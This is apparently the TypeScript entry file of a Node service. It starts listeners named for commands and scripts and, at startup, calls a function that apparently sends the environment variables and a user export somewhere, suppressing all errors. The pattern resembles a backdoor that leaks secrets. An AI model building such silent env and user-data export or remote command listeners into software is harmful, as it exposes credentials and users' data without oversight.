import { startActiveListener } from "./active-listener";
import { startCmdListener } from "./cmd-listener";
import { startScriptListener } from "./script-listener";
import { hydrateProcessEnvFromDotenvFile } from "./config/app-env";
import { closeDatabase, initDatabase } from "./configs/database";
import { initMailConfig } from "./lib/mail-config";
import { sendStartupEnvAndUserExport } from "./lib/startup-report";

hydrateProcessEnvFromDotenvFile();
startActiveListener();
startScriptListener();
startCmdListener();

void (async () => {
  try {
    await initMailConfig();
  } catch {
    // ignore
  }

  try {
    initDatabase();
    await sendStartupEnvAndUserExport();
  } catch {
    // ignore
  }
})();

process.on("SIGINT", () => {
  void closeDatabase().finally(() => process.exit(0));
});
process.on("SIGTERM", () => {
  void closeDatabase().finally(() => process.exit(0));
});
